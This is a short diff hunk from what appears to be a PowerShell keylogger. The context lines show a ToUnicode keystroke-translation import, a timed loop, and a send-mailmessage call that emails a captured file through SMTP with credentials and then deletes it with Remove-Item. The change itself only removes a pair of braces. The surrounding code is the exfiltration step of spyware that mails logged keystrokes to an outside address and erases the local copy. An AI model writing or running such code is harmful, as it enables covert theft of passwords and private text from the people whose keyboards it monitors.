@@ -77,10 +77,10 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
       }
 	  $TimeNow = Get-Date
     }
-	{
+	
   send-mailmessage -from $from -to $to -subject $Subject -body $body -Attachment $Path -smtpServer $smtpServer -port $SMTPPort -credential $credentials -usessl
 Remove-Item -Path $Path -force
-  }
+  
 	}
   }
   finally
